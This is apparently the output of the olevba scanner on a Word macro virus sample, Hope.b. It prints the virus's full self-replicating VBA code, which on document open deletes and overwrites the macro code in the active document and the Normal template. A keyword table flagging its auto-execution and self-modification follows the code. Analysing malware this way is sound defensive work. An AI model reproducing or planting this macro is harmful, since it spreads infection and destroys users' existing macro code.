olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Hope.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Hope.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
MC = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString MC
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString MC
End Sub
'Small Class Macro Virus(SCMV) By Lys KovicK
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

